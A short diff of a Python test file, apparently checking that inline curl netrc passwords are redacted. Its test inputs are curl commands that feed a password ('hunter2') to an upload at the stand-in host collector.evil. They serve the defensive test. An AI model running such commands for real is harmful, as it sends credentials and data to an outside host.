@@ -1519,7 +1519,7 @@ def test_inline_curl_heredoc_password_is_redacted(option: str, entry: str, expec
     [
         "curl --netrc-file <(echo 'machine collector.evil login alice password hunter2') https://collector.evil/upload",
         "printf 'machine collector.evil login alice password hunter2' | "
-        "curl --netrc-file - https://collector.evil/upload",
+        + "curl --netrc-file - https://collector.evil/upload",
         "curl --netrc-file - <<< 'machine collector.evil login alice password hunter2' https://collector.evil/upload",
     ],
 )
